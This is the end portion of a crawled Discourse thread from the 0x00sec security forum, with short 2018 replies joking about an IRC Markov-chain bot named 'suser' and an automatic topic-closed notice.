            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="15" />
              <span class='post-likes'>15 Likes</span>
            </div>

                <div class='crawler-linkback-list' itemscope itemtype='../../../external.html?link=http://schema.org/ItemList'>
                      <div itemprop='itemListElement' itemscope itemtype='../../../external.html?link=http://schema.org/ListItem'>
                        <a itemprop='url' href="../../../external.html?link=https://0x00sec.org/t/clientside-exploitation-tricks-of-the-trade-0x01-sharpshooter-squibblytwo/8178">Clientside Exploitation - Tricks of the Trade 0x01 - Sharpshooter + SquibblyTwo</a>
                        <meta itemprop='position' content='15'>
                      </div>
                </div>

            
          </div>
          <div id='post_2' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/pry0cc.html'><span itemprop='name'>pry0cc</span></a>
                (Leader &amp; Offsec Engineer &amp; Forum Daddy)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2018-07-01T20:30:58Z' class='post-time'>
                    July 1, 2018,  8:30pm
                  </time>
                  <meta itemprop='dateModified' content='2018-07-01T20:30:58Z'>
              <span itemprop='position'>2</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>PS. This is not to say that you can not get in externally via just the network. You can definitely. In some very protected networks however, this method seems to work as a good fallback.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_3' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/nugget.html'><span itemprop='name'>nugget</span></a>
                (nugget)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2018-07-01T20:36:45Z' class='post-time'>
                    July 1, 2018,  8:36pm
                  </time>
                  <meta itemprop='dateModified' content='2018-07-01T20:36:45Z'>
              <span itemprop='position'>3</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>I want to know what suser looks like</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="3" />
              <span class='post-likes'>3 Likes</span>
            </div>


            
          </div>
          <div id='post_4' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/dtm.html'><span itemprop='name'>dtm</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2018-07-01T21:05:48Z' class='post-time'>
                    July 1, 2018,  9:05pm
                  </time>
                  <meta itemprop='dateModified' content='2018-07-01T21:05:48Z'>
              <span itemprop='position'>4</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Who is this ‚Äúsuser‚Äù person? I‚Äôve never seen them around on this forum before.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="3" />
              <span class='post-likes'>3 Likes</span>
            </div>


            
          </div>
          <div id='post_5' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/nugget.html'><span itemprop='name'>nugget</span></a>
                (nugget)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2018-07-01T21:07:25Z' class='post-time'>
                    July 1, 2018,  9:07pm
                  </time>
                  <meta itemprop='dateModified' content='2018-07-01T21:07:25Z'>
              <span itemprop='position'>5</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>One of the admins (IRC) side for this network, she is apparently quite beautiful; I am just curious</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="2" />
              <span class='post-likes'>2 Likes</span>
            </div>


            
          </div>
          <div id='post_6' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/pry0cc.html'><span itemprop='name'>pry0cc</span></a>
                (Leader &amp; Offsec Engineer &amp; Forum Daddy)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2018-07-01T21:08:43Z' class='post-time'>
                    July 1, 2018,  9:08pm
                  </time>
                  <meta itemprop='dateModified' content='2018-07-01T21:08:43Z'>
              <span itemprop='position'>6</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>I‚Äôm not a genie. Also, I don‚Äôt think it‚Äôs possible to ‚Äúsee‚Äù a markov chains bot.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="3" />
              <span class='post-likes'>3 Likes</span>
            </div>


            
          </div>
          <div id='post_7' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/nugget.html'><span itemprop='name'>nugget</span></a>
                (nugget)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2018-07-01T21:09:57Z' class='post-time'>
                    July 1, 2018,  9:09pm
                  </time>
                  <meta itemprop='dateModified' content='2018-07-01T21:09:57Z'>
              <span itemprop='position'>7</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Could see its source code, but she is real I know it I have seen her delicate hand on webcam</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_8' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/pry0cc.html'><span itemprop='name'>pry0cc</span></a>
                (Leader &amp; Offsec Engineer &amp; Forum Daddy)
                  Closed 
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2018-07-31T20:26:52Z' class='post-time'>
                    July 31, 2018,  8:26pm
                  </time>
                  <meta itemprop='dateModified' content='2018-07-31T20:26:52Z'>
              <span itemprop='position'>8</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
    </div>


    




    </div>
    <footer class="container wrap">
  <nav class='crawler-nav'>
    <ul>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../index.html' itemprop="url">Home </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../categories.html' itemprop="url">Categories </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../guidelines.html' itemprop="url">Guidelines </a>
        </span>
      </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../tos.html' itemprop="url">Terms of Service </a>
          </span>
        </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../privacy.html' itemprop="url">Privacy Policy </a>
          </span>
        </li>
    </ul>
  </nav>
  <p class='powered-by-link'>Powered by <a href="../../../external.html?link=https://www.discourse.org/">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>

    
    <script src="../../../external.html?link=http://instant.page/3.0.0" type="module" defer="" integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1" nonce="yb0ALw9rAGUPSdILPCLJQxiar"></script>
  </body>
  
</html>
